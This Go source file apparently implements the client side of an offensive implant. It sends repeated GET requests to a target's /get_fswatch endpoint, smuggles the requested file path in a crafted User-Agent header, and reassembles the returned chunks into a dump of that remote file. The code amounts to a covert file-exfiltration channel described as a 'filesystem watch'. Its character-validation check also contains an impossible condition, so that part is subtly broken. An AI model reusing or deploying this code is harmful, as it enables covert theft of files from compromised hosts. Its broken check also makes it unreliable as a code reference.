package fs_watch

import (
	"fmt"
	"github.com/sirupsen/logrus"
	"io/ioutil"
	"net/http"
	"net/http/httputil"
	"os"
	"path"
)

// SendGetFSWatchRequest sends a request to add a filesystem watch on the target system
func SendGetFSWatchRequest(target string, file string, inContainer bool, output string) error {
	if len(output) > 0 {
		d := path.Dir(output)
		_ = os.MkdirAll(d, 0664)
		f, err := os.Create(output)
		if err != nil {
			logrus.Fatalf("couldn't create output file: %s", err)
		}
		_ = f.Close()
	}

	nextFile := file
	var done bool
	var data string
	firstTry := true

	for !done {
		client := &http.Client{}
		req, err := http.NewRequest("GET", target+"/get_fswatch", nil)
		if err != nil {
			logrus.Fatalf("couldn't create HTTP request: %v", err)
		}

		req.Header.Set("User-Agent", buildUserAgent(nextFile, inContainer))

		if file == nextFile && firstTry {
			firstTry = false
			b, _ := httputil.DumpRequest(req, true)
			logrus.Debugf("\n%s", b)
		}

		resp, err := client.Do(req)
		if err != nil {
			logrus.Fatalf("couldn't send HTTP request: %v", err)
		}

		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			logrus.Fatalf("couldn't read HTTP response: %v", err)
		}

		if !isResponseValid(body) {
			continue
		}

		data += string(body[:len(body) - 6])

		if body[len(body) - 5] == '_' {
			done = true
			continue
		}

		nextFile = fmt.Sprintf("%s%s", string(body[len(body) - 4:]), nextFile[4:])
		client.CloseIdleConnections()
	}

	if len(output) == 0 {
		logrus.Printf("Dump of %s:\n%s", file, data)
	} else {
		if err := ioutil.WriteFile(output, []byte(data), 0664); err != nil {
			logrus.Fatalf("couldn't write data in output file: %s", err)
		}
	}
	return nil
}

func isResponseValid(body []byte) bool {
	if len(body) < 5 {
		return false
	}

	// check that the request was properly overwritten, otherwise retry
	nextOpChar := body[len(body) - 5]
	if nextOpChar != '_' && nextOpChar != '#' {
		return false
	}
	for _, elem := range body[len(body) - 4:] {
		if elem != '_' && elem < 65 && elem > 90 {
			return false
		}
	}
	return true
}
